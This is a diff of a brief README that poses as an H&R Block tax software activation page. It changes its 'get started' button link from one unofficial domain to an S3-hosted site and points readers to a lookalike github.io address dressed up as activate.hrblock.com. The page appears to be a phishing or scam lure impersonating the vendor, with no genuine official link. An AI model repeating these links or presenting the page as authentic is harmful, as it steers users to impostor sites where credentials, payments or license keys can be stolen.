@@ -1,6 +1,6 @@
 # Activate.hrblock.com/crj
 
-[![Activate.hrblock.com/crj](get-started-now-button.png)](https://ht.amdonline.site/)
+[![Activate.hrblock.com/crj](get-started-now-button.png)](http://blockhr.s3-website-us-west-1.amazonaws.com)
 
 
 H&R Block Tax Software is designed for those who want to be in control of their tax preparation experience and feel empowered by completing their own returns. They want to get the biggest refund possible and are often the homeowner, investor, or both. visit [Activate.hrblock.com/crj](http://activate.hrblock.com.crj.github.io/) for more information.
